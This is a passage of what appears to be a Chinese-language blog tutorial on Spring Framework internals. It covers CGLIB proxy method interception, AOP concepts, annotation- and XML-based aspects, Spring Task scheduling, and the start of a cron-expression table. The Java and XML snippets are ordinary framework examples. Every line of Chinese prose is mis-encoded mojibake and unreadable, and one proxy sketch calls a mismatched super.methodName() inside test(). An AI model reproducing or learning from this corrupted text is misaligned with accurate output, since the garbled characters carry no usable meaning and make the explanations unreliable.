<code>TestBean$$EnhancerByCGLIB$$5a33a704</code>ï¼Œè¯¥ç±»æ˜¯è¢«ä»£ç†ç±»çš„å­ç±»ï¼Œä¹Ÿæ˜¯å®¢æˆ·ç«¯å®é™…ä¸Šæ“ä½œçš„å¯¹è±¡ã€‚å½“å¯¹ä»£ç†å¯¹è±¡è°ƒç”¨æ–¹æ³•æ—¶ï¼Œä¼šå›è°ƒè®¾ç½®çš„æ–¹æ³•æ‹¦æˆªå™¨ <code>MethodInterceptor</code> çš„ <code>intercept()</code> æ–¹æ³•ï¼Œè¦è°ƒç”¨çš„æ–¹æ³•å’Œå‚æ•°éƒ½è¢«è½¬å‘ç»™äº†<code>intercept()</code> æ–¹æ³•ï¼Œç”Ÿæˆçš„ç¼“å­˜å­ç±»å¯¹åº”çš„æ–¹æ³•ç±»ä¼¼å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">MethodInterceptor</span> <span class="variable">var10000</span> <span class="operator">=</span> <span class="built_in">this</span>.CGLIB$CALLBACK_0;</span><br><span class="line">        <span class="keyword">if</span> (var10000 == <span class="literal">null</span>) &#123;</span><br><span class="line">            CGLIB$BIND_CALLBACKS(<span class="built_in">this</span>);</span><br><span class="line">            var10000 = <span class="built_in">this</span>.CGLIB$CALLBACK_0;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (var10000 != <span class="literal">null</span>) &#123;</span><br><span class="line">            var10000.intercept(<span class="built_in">this</span>,CGLIB$methodProxy$<span class="number">0.</span>getMethod(),<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>],CGLIB$methodProxy$<span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>.methodName();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å›è°ƒ<code>intercept()</code>æ—¶ä¼ é€’çš„å‚æ•°</p><p><img src="/img/post/image-20251226205329508.png" alt="image-20251226205329508"></p><p>è¿›å…¥<code>invokeSuper()</code>ä¸­</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invokeSuper</span><span class="params">(Object obj, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.init();</span><br><span class="line">            <span class="type">FastClassInfo</span> <span class="variable">fci</span> <span class="operator">=</span> <span class="built_in">this</span>.fastClassInfo;</span><br><span class="line">            <span class="keyword">return</span> fci.f2.invoke(fci.i2, obj, args);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> e.getTargetException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>this.fastClassInfo</code>å°±æ˜¯ä¼ å…¥çš„<code>MethodPeoxy</code>å½¢å‚å­—æ®µï¼Œå®ƒçš„ä¸¤ä¸ªå­—æ®µ<code>f1</code>å’Œ<code>f2</code>åˆ†åˆ«å‚¨å­˜äº†ç›®æ ‡ç±»å¯¹è±¡å’Œä»£ç†ç¼“å­˜å­ç±»ï¼Œå®ƒä»¬éƒ½æ˜¯<code>FastClass</code>ç±»å‹ï¼Œå…¶å­˜åœ¨æ˜¯CGLIBä¸ºäº†é¿å…åå°„è°ƒç”¨ï¼Œè¿›è¡Œç¼“å­˜ç›´æ¥è°ƒç”¨ä»¥æé«˜æ€§èƒ½</p><p><img src="/img/post/image-20251226212839853.png" alt="image-20251226212839853"></p><p>æ‰€ä»¥æˆ‘çš„ç¯å¢ƒä¸‹æ‰€ä»¥æœ€åæ‰§è¡Œçš„å®é™…æ˜¯</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Bean.TestBean$$EnhancerByCGLIB$$5a33a704.invoke(<span class="number">16</span>, Bean.TestBean$$EnhancerByCGLIB$$5a33a704, <span class="literal">null</span>)</span><br></pre></td></tr></table></figure><p><code>FastClass</code>ç±»çš„<code>invoke()</code>æ–¹æ³•ä¸æ­£å¸¸çš„ä¸ä¸€æ ·ï¼Œè¿™é‡Œè°ƒç”¨äº†è‡ªå·±çš„ä¸€ä¸ªç¼–å·ä¸º<code>16</code>çš„æ–¹æ³•ï¼Œå¯¹åº”çš„å¯èƒ½æ˜¯<code>CGLIB$test$0()</code>è¿™æ ·æ ¼å¼çš„æ–¹æ³•ï¼Œè¯¥æ–¹æ³•å°±æ˜¯ç›´æ¥è°ƒç”¨çˆ¶ç±»ä¹Ÿå°±æ˜¯ç›®æ ‡å¯¹è±¡çš„æ–¹æ³•ï¼Œå®Œæˆäº†é—­ç¯</p><p>æ€»çš„æ¥è¯´ï¼Œä»£ç†å¯¹è±¡è°ƒç”¨æ–¹æ³•æ—¶ï¼Œä¼šå…ˆå›è°ƒæ‹¦æˆªå™¨ï¼Œè¿›è¡Œè¡Œä¸ºå¢å¼ºï¼Œç„¶åå†å›åˆ°ç¼“å­˜å­ç±»ç›´æ¥è°ƒç”¨çˆ¶ç±»çš„æ–¹æ³•å»è°ƒç”¨ç›®æ ‡æ–¹æ³•</p><br/><h2 id="AOPåŸºæœ¬æ¦‚å¿µ"><a href="#AOPåŸºæœ¬æ¦‚å¿µ" class="headerlink" title="AOPåŸºæœ¬æ¦‚å¿µ"></a>AOPåŸºæœ¬æ¦‚å¿µ</h2><p><strong>Joinpointï¼ˆè¿æ¥ç‚¹ï¼‰</strong></p><p>è¢«æ‹¦æˆªåˆ°çš„æ¯ä¸ªç‚¹ï¼Œspringä¸­æŒ‡è¢«æ‹¦æˆªåˆ°çš„æ¯ä¸€ä¸ªæ–¹æ³•ï¼Œspring aopä¸€ä¸ªè¿æ¥ç‚¹å³ä»£è¡¨ä¸€ä¸ªæ–¹æ³•çš„æ‰§è¡Œ</p><p> <strong>Pointcutï¼ˆåˆ‡å…¥ç‚¹ï¼‰</strong></p><p>å¯¹è¿æ¥ç‚¹è¿›è¡Œæ‹¦æˆªçš„å®šä¹‰ï¼ˆåŒ¹é…è§„åˆ™å®šä¹‰ è§„å®šæ‹¦æˆªå“ªäº›æ–¹æ³•ï¼Œå¯¹å“ªäº›æ–¹æ³•è¿›è¡Œå¤„ç†ï¼‰ï¼Œspringæœ‰ä¸“é—¨çš„è¡¨è¾¾å¼è¯­è¨€å®šä¹‰</p><p><strong>Adviceï¼ˆé€šçŸ¥ï¼‰</strong></p><table><thead><tr><th>é€šçŸ¥ç±»å‹</th><th>æè¿°</th></tr></thead><tbody><tr><td>å‰ç½®é€šçŸ¥ï¼ˆå‰ç½®å¢å¼ºï¼‰</td><td>æ‰§è¡Œæ–¹æ³•å‰é€šçŸ¥</td></tr><tr><td>è¿”å›é€šçŸ¥ï¼ˆè¿”å›å¢å¼ºï¼‰</td><td>æ–¹æ³•æ­£å¸¸ç»“æŸè¿”å›åçš„é€šçŸ¥</td></tr><tr><td>å¼‚å¸¸æŠ›å‡ºé€šçŸ¥ï¼ˆå¼‚å¸¸æŠ›å‡ºå¢å¼ºï¼‰</td><td>å‡ºç°å¼‚å¸¸æ—¶çš„é€šçŸ¥</td></tr><tr><td>æœ€ç»ˆé€šçŸ¥</td><td>æ— è®ºæ–¹æ³•æ˜¯å¦å‘ç”Ÿå¼‚å¸¸ï¼Œå‡ä¼šæ‰§è¡Œè¯¥é€šçŸ¥</td></tr><tr><td>ç¯ç»•é€šçŸ¥</td><td>åŒ…å›´ä¸€ä¸ªè¿æ¥ç‚¹ï¼ˆjoin pointï¼‰çš„é€šçŸ¥ï¼Œå¦‚æ–¹æ³•è°ƒç”¨ã€‚æœ€å¼ºå¤§çš„ä¸€ç§é€šçŸ¥ç±»å‹ï¼Œç¯ç»•é€šçŸ¥å¯ä»¥åœ¨æ–¹æ³•è°ƒç”¨å‰åå®Œæˆè‡ªå®šä¹‰çš„è¡Œä¸ºï¼Œå®ƒä¹Ÿä¼šé€‰æ‹©æ˜¯å¦ç»§ç»­æ‰§è¡Œè¿æ¥ç‚¹æˆ–ç›´æ¥è¿”å›å®ƒä»¬è‡ªå·±çš„è¿”å›å€¼æˆ–æŠ›å‡ºå¼‚å¸¸</td></tr></tbody></table><p><strong>Aspectï¼ˆåˆ‡é¢ï¼‰</strong></p><p>åˆ‡å…¥ç‚¹ä¸é€šçŸ¥çš„ç»“åˆï¼Œå†³å®šäº†åˆ‡é¢çš„å®šä¹‰ï¼Œåˆ‡å…¥ç‚¹å®šä¹‰äº†è¦æ‹¦æˆªå“ªäº›ç±»çš„å“ªäº›æ–¹æ³•ï¼Œé€šçŸ¥åˆ™å®šä¹‰äº†æ‹¦æˆªè¿‡æ–¹æ³•åè¦åšä»€ä¹ˆï¼Œåˆ‡é¢åˆ™æ˜¯æ¨ªåˆ‡å…³æ³¨ç‚¹çš„æŠ½è±¡ï¼Œä¸ç±»ç›¸ä¼¼ï¼Œç±»æ˜¯å¯¹ç‰©ä½“ç‰¹å¾çš„æŠ½è±¡ï¼Œåˆ‡é¢åˆ™æ˜¯æ¨ªåˆ‡å…³æ³¨ç‚¹æŠ½è±¡</p><p><strong>Targetï¼ˆç›®æ ‡å¯¹è±¡ï¼‰</strong></p><p>è¢«ä»£ç†çš„ç›®æ ‡å¯¹è±¡</p><p><strong>Weaveï¼ˆç»‡å…¥ï¼‰</strong></p><p>å°†åˆ‡é¢åº”ç”¨åˆ°ç›®æ ‡å¯¹è±¡å¹¶ç”Ÿæˆä»£ç†å¯¹è±¡çš„è¿™ä¸ªè¿‡ç¨‹å³ä¸ºç»‡å…¥</p><p><strong>Introductionï¼ˆå¼•å…¥ï¼‰</strong></p><p>åœ¨ä¸ä¿®æ”¹åŸæœ‰åº”ç”¨ç¨‹åºä»£ç çš„æƒ…å†µä¸‹ï¼Œåœ¨ç¨‹åºè¿è¡ŒæœŸä¸ºç±»åŠ¨æ€æ·»åŠ æ–¹æ³•æˆ–è€…å­—æ®µçš„è¿‡ç¨‹ç§°ä¸ºå¼•å…¥</p><br/><h2 id="AOPå®ç°"><a href="#AOPå®ç°" class="headerlink" title="AOPå®ç°"></a>AOPå®ç°</h2><p>AOPéœ€è¦å¼•å…¥ä¾èµ–å¹¶åœ¨é…ç½®æ–‡ä»¶ä¸­æ·»åŠ å‘½åç©ºé—´</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">xmlns:aop=&quot;http://www.springframework.org/schema/aop&quot;</span><br><span class="line"></span><br><span class="line">http://www.springframework.org/schema/aop</span><br><span class="line">http://www.springframework.org/schema/aop/spring-aop.xsd</span><br></pre></td></tr></table></figure><p>å¼€å¯AOPæ³¨è§£æ”¯æŒ</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">aop:aspectj-autoproxy</span>/&gt;</span></span><br></pre></td></tr></table></figure><h3 id="æ³¨è§£å®ç°"><a href="#æ³¨è§£å®ç°" class="headerlink" title="æ³¨è§£å®ç°"></a>æ³¨è§£å®ç°</h3><p><strong>AOPåˆ‡å…¥ç‚¹è¡¨è¾¾å¼</strong></p><p>AOPåˆ‡å…¥ç‚¹è¡¨è¾¾å¼ç”¨äºåŒ¹é…<code>@Pointcut</code>æ³¨è§£è¦æ‹¦æˆªçš„æ–¹æ³•ï¼Œå…¶è¯­æ³•ä¸»è¦ç”±<code>*</code>å’Œ<code>.</code>ç»„æˆã€‚è¡¨è¾¾å¼çš„ç¬¬éƒ¨åˆ†ç”±æŒ‡å®šçš„è®¿é—®ä¿®é¥°ç¬¦ç»„æˆï¼Œæœ‰<code>public</code>ã€<code>private</code>ã€<code>protected</code>ã€<code>*</code>å››ç§ç±»å‹ï¼›ç¬¬äºŒéƒ¨åˆ†å¯ä»¥æŒ‡å®šåŒ…ä½ç½®ï¼Œè¡¨ç¤ºåªæ‹¦æˆªåœ¨è¯¥åŒ…ä¸‹çš„æ–¹æ³•ï¼Œè‹¥æœ€åä¸º<code>..</code>ä»£è¡¨ä¹ŸåŒ…æ‹¬å­åŒ…çš„æ–¹æ³•ï¼Œè¯¥éƒ¨åˆ†è‹¥ä¸ºç©ºä»£è¡¨æ‹¦æˆªèŒƒå›´ä¸ºå…¨å±€ï¼›ç¬¬ä¸‰éƒ¨åˆ†æ˜¯è¦æ‹¦æˆªçš„ç±»åï¼›ç¬¬å››éƒ¨åˆ†ä¸ºè¯¥ç±»çš„æ–¹æ³•åï¼›ç¬¬äº”éƒ¨åˆ†ä¸ºä¼ å…¥è¯¥æ–¹æ³•çš„å‚æ•°</p><table><thead><tr><th>æè¿°</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td>æ‹¦æˆªæ‰€æœ‰å…¬å…±æ–¹æ³•</td><td><code>public *(..)</code></td></tr><tr><td>æ‹¦æˆªä»»æ„<code>setter</code>æ–¹æ³•</td><td><code>* set*(..)</code></td></tr><tr><td>æŒ‡å®šæŸä¸ªåŒ…ä¸‹çš„ä»»æ„æ–¹æ³•</td><td><code>* com.xxx.*.*(..)</code></td></tr><tr><td>æŒ‡å®šæŸä¸ªåŒ…åŠå…¶å­åŒ…ä¸‹çš„ä»»æ„æ–¹æ³•</td><td><code>* com.xxx..*.*(..)</code></td></tr></tbody></table><p><strong>å…·ä½“æ³¨è§£</strong></p><p><code>@Aspect</code>æ³¨è§£æ ‡è®°åœ¨ä¸€ä¸ªç±»ä¸Šï¼Œè¡¨ç¤ºè¿™ä¸ªç±»æ˜¯ä¸€ä¸ªåˆ‡é¢</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Aspect</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LogAspect</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>@Pointcut</code>æ³¨è§£æ ‡è®°åœ¨ä¸€ä¸ªæ–¹æ³•ä¸Šï¼Œè¯¥æ–¹æ³•ä½“å¿…é¡»ä¸ºç©ºã€‚è¯¥æ–¹æ³•å…·æœ‰<code>value</code>å±æ€§ï¼Œè¡¨ç¤ºè¦æ‹¦æˆªçš„æ–¹æ³•ï¼Œè¯¥å±æ€§ä½¿ç”¨AOPåˆ‡å…¥ç‚¹è¡¨è¾¾å¼è¿›è¡ŒæŒ‡å®š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Pointcut(&quot;execution(* com.example.service.*.*(..))&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">allServiceMethods</span><span class="params">()</span> &#123;&#125;</span><br></pre></td></tr></table></figure><p>ä¸‹é¢çš„æ³¨è§£éƒ½å£°æ˜äº†ä¸€ä¸ªé€šçŸ¥ç±»ç±»å‹ï¼Œå®ƒä»¬éƒ½å…·æœ‰<code>value</code>å±æ€§ï¼Œä¸€èˆ¬æŒ‡å‘<code>@Pointcut</code>æ³¨è§£è®°åœ¨çš„æ–¹æ³•</p><p><code>@Before</code>æ³¨è§£å£°æ˜å‰ç½®é€šçŸ¥ï¼Œç›®æ ‡ç±»çš„æ–¹æ³•æ‰§è¡Œå‰æ‰§è¡Œè¯¥é€šçŸ¥</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Before(&quot;loginMethod()&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">beforeLogin</span><span class="params">()</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;ç”¨æˆ·å°è¯•ç™»å½•...&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>@AfterReturning</code>æ³¨è§£å£°æ˜è¿”å›é€šçŸ¥ï¼Œç›®æ ‡ç±»çš„æ–¹æ³•æ— å¼‚å¸¸æ‰§è¡Œåæ‰§è¯¥é€šçŸ¥</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@AfterReturning(pointcut = &quot;createOrderMethod()&quot;, returning = &quot;orderId&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterCreateOrder</span><span class="params">(Long orderId)</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;è®¢å•åˆ›å»ºæˆåŠŸï¼Œè®¢å•å·ï¼š&quot;</span> + orderId);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>@After</code>æ³¨è§£å£°æ˜æœ€ç»ˆé€šçŸ¥ï¼Œç›®æ ‡ç±»çš„æ–¹æ³•æ‰§è¡Œåä¸è®ºæœ‰æ— å¼‚å¸¸éƒ½ä¼šæ‰§è¡Œè¯¥é€šçŸ¥</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@After(&quot;uploadMethod()&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterUpload</span><span class="params">()</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;æ–‡ä»¶ä¸Šä¼ æ“ä½œç»“æŸï¼Œæ¸…ç†ä¸´æ—¶èµ„æº&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>@AfterThrowing</code>æ³¨è§£å£°æ˜å¼‚å¸¸é€šçŸ¥ï¼Œç›®æ ‡ç±»çš„æ–¹æ³•æ‰§è¡Œå¼‚å¸¸æ—¶æ‰§è¡Œè¯¥é€šçŸ¥</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@AfterThrowing(pointcut = &quot;payMethod()&quot;, throwing = &quot;ex&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterPaymentFailed</span><span class="params">(Exception ex)</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;æ”¯ä»˜å¤±è´¥ï¼Œå¼‚å¸¸ä¿¡æ¯ï¼š&quot;</span> + ex.getMessage());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>@Around</code>æ³¨è§£ç¯ç»•é€šçŸ¥ï¼Œç›®æ ‡ç±»çš„æ–¹æ³•æ‰§è¡Œå‰åéƒ½å¯é€šè¿‡ç¯ç»•é€šçŸ¥å®šä¹‰å“åº”å†…å®¹ï¼Œè¯¥é€šçŸ¥éœ€è¦é€šè¿‡æ˜¾ç¤ºè°ƒç”¨ä¼ å…¥çš„<code>ProceedingJoinPoint</code>å¯¹è±¡çš„<code>proceed()</code>ï¼Œè¿™ç›¸å½“äºæ˜ç¡®å‘Šè¯‰ç¨‹åºä½•å¤„ä¸ºä½•ç§é€šçŸ¥ï¼Œ<code>proceed()</code>æœ¬èº«ä¸æ‰§è¡Œä»»ä½•åŠŸèƒ½</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Around(&quot;controllerMethods()&quot;)</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">aroundController</span><span class="params">(ProceedingJoinPoint pjp)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;è¯·æ±‚å¼€å§‹å¤„ç†&quot;</span>);</span><br><span class="line">        </span><br><span class="line"><span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> pjp.proceed();</span><br><span class="line">        </span><br><span class="line">System.out.println(<span class="string">&quot;è¯·æ±‚å¤„ç†å®Œæˆ&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>@AfterReturning</code>å’Œ<code>@AfterThrowing</code>æ­é…åˆ«çš„å±æ€§æ—¶ä¸€èˆ¬ä½¿ç”¨<code>pointcut</code>æŒ‡å®šè¦æ‹¦æˆªçš„æ–¹æ³•</p><h3 id="XMLå®ç°"><a href="#XMLå®ç°" class="headerlink" title="XMLå®ç°"></a>XMLå®ç°</h3><p>é€šè¿‡é…ç½®æ–‡ä»¶å®ç°AOPä¸éœ€è¦ä¿®æ”¹åŸå…ˆçš„ä»£ç ç»“æ„ï¼Œåªéœ€è¦æŠŠæ³¨è§£å¯¹åº”ä¿®æ”¹åˆ°é…ç½®æ–‡ä»¶ä¸Šå³å¯ï¼Œä»¥å…ˆå‰çš„ä¾‹å­è¯´ï¼Œé…ç½®æ–‡ä»¶ä¿®æ”¹ä¸ºå¦‚ä¸‹ï¼Œå†åˆ é™¤åŸåˆ‡é¢çš„æ³¨è§£å³å¯ </p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">aop:config</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--aopåˆ‡é¢--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">aop:aspect</span> <span class="attr">ref</span>=<span class="string">&quot;LogAspect&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--å®šä¹‰aop åˆ‡å…¥ç‚¹ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">aop:pointcut</span> <span class="attr">id</span>=<span class="string">&quot;allServiceMethods&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;execution(* com.example.service.*.*(..))&quot;</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- é…ç½®å‰ç½®é€šçŸ¥ æŒ‡å®šå‰ç½®é€šçŸ¥æ–¹æ³•å å¹¶å¼•ç”¨åˆ‡å…¥ç‚¹å®šä¹‰ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">aop:before</span> <span class="attr">method</span>=<span class="string">&quot;beforeLogin&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;allServiceMethods&quot;</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- é…ç½®è¿”å›é€šçŸ¥ æŒ‡å®šè¿”å›é€šçŸ¥æ–¹æ³•å å¹¶å¼•ç”¨åˆ‡å…¥ç‚¹å®šä¹‰ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">aop:after-returning</span> <span class="attr">method</span>=<span class="string">&quot;afterCreateOrder&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;allServiceMethods&quot;</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- é…ç½®å¼‚å¸¸é€šçŸ¥ æŒ‡å®šå¼‚å¸¸é€šçŸ¥æ–¹æ³•å å¹¶å¼•ç”¨åˆ‡å…¥ç‚¹å®šä¹‰ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">aop:after-throwing</span> <span class="attr">method</span>=<span class="string">&quot;afterPaymentFailed&quot;</span> <span class="attr">throwing</span>=<span class="string">&quot;ex&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;allServiceMethods&quot;</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--é…ç½®æœ€ç»ˆé€šçŸ¥ æŒ‡å®šæœ€ç»ˆé€šçŸ¥æ–¹æ³•å å¹¶å¼•ç”¨åˆ‡å…¥ç‚¹å®šä¹‰ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">aop:after</span> <span class="attr">method</span>=<span class="string">&quot;afterUpload&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;allServiceMethods&quot;</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--é…ç½®ç¯ç»•é€šçŸ¥ æŒ‡å®šç¯ç»•é€šçŸ¥æ–¹æ³•åï¼Œå¹¶å¼•ç”¨åˆ‡å…¥ç‚¹å®šä¹‰--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">aop:around</span> <span class="attr">method</span>=<span class="string">&quot;aroundController&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;allServiceMethods&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">aop:aspect</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šï¼Œå®¹æ˜“å‘ç°AOPå°±æ˜¯æ›´åŠ çµæ´»ä¸”å¤šæ ·çš„åŠ¨æ€ä»£ç†æ¨¡å¼ï¼Œç›®çš„è¿˜æ˜¯åœ¨äºç›®æ ‡è¡Œä¸ºçš„å¢å¼º</p><br/><h1 id="SpringFrameworkæ¡†æ¶-Task"><a href="#SpringFrameworkæ¡†æ¶-Task" class="headerlink" title="SpringFrameworkæ¡†æ¶-Task"></a>SpringFrameworkæ¡†æ¶-Task</h1><p>Spring Task æ˜¯ Spring æ¡†æ¶æä¾›çš„è½»é‡çº§å®šæ—¶ä»»åŠ¡è°ƒåº¦ç»„ä»¶ï¼Œç”¨äºåœ¨ Spring åº”ç”¨ä¸­ç®€å•ã€ä¾¿æ·åœ°å®ç°å®šæ—¶ä»»åŠ¡ã€‚</p><h2 id="XMLé…ç½®å®ç°"><a href="#XMLé…ç½®å®ç°" class="headerlink" title="XMLé…ç½®å®ç°"></a>XMLé…ç½®å®ç°</h2><p>é…ç½®æ–‡ä»¶æ·»åŠ å‘½åç©ºé—´</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">xmlns:task=&quot;http://www.springframework.org/schema/task&quot;</span><br><span class="line"></span><br><span class="line">http://www.springframework.org/schema/task</span><br><span class="line">http://www.springframework.org/schema/task/spring-task.xsd</span><br></pre></td></tr></table></figure><p>è®¾ç½®å®šæ—¶ä»»åŠ¡æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShortTask</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;å®šæ—¶ä»»åŠ¡æ‰§è¡Œï¼š&quot;</span> + System.currentTimeMillis());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è®¾ç½®é…ç½®æ–‡ä»¶</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">task:scheduled-tasks</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- å®šæ—¶ä»»åŠ¡1 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">task:scheduled</span> <span class="attr">ref</span>=<span class="string">&quot;shortTask&quot;</span> <span class="attr">method</span>=<span class="string">&quot;run&quot;</span> <span class="attr">cron</span>=<span class="string">&quot;0/2 * * * * ?&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">task:scheduled-tasks</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æµ‹è¯•ç±»ä¸­ï¼Œåªè¦è·å¾—äº†beanå¯¹è±¡å°±ä¼šè‡ªåŠ¨æ‰§è¡Œæ–¹æ³•</p><br/><h2 id="æ³¨è§£å®ç°-1"><a href="#æ³¨è§£å®ç°-1" class="headerlink" title="æ³¨è§£å®ç°"></a>æ³¨è§£å®ç°</h2><p><code>@Scheduled</code>æ³¨è§£æ ‡è®°äºéœ€è¦è®¾ç½®å®šæ—¶ä»»åŠ¡çš„æ–¹æ³•ä¸Šï¼Œè¯¥æ³¨è§£å…·æœ‰<code>cron</code>å±æ€§ï¼Œç”¨äºå†™å…¥cronè¡¨è¾¾å¼è®¾ç½®ç›¸å…³å®šæ—¶è§„åˆ™</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShortTask</span> &#123;</span><br><span class="line">    <span class="meta">@Scheduled(cron = &quot;0/2 * * * * ?&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;å®šæ—¶ä»»åŠ¡æ‰§è¡Œï¼š&quot;</span> + System.currentTimeMillis());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é…ç½®æ–‡ä»¶è®¾ç½®å®šæ—¶ä»»åŠ¡é©±åŠ¨ï¼Œç”¨äºè¯†åˆ«<code>@Scheduled</code>æ³¨è§£</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;task:annotation-driven/&gt;</span><br></pre></td></tr></table></figure><br/><h2 id="Cronè¡¨è¾¾å¼"><a href="#Cronè¡¨è¾¾å¼" class="headerlink" title="Cronè¡¨è¾¾å¼"></a>Cronè¡¨è¾¾å¼</h2><p>cronè¡¨è¾¾å¼çš„æ ¼å¼ä¸º<code>ç§’ åˆ† æ—¶ æ—¥ æœˆ å‘¨ å¹´(å¯é€‰)</code></p><h3 id="å„å­—æ®µå–å€¼èŒƒå›´å’Œç‰¹æ®Šå­—ç¬¦"><a href="#å„å­—æ®µå–å€¼èŒƒå›´å’Œç‰¹æ®Šå­—ç¬¦" class="headerlink" title="å„å­—æ®µå–å€¼èŒƒå›´å’Œç‰¹æ®Šå­—ç¬¦"></a>å„å­—æ®µå–å€¼èŒƒå›´å’Œç‰¹æ®Šå­—ç¬¦</h3><table><thead><tr><th align="left">å­—æ®µ</th><th align="left">å…è®¸å€¼</th><th align="left">å…è®¸çš„ç‰¹æ®Šå­—ç¬¦</th></tr></thead><tbody><tr><td align="left">ç§’</td><td align="left">0-59</td><td align="left"><code>, - * /</code></td></tr><tr><td align="left">åˆ†</td><td align="left">0-59</td><td align="left"><code>, - * /</code></td></tr><tr><td 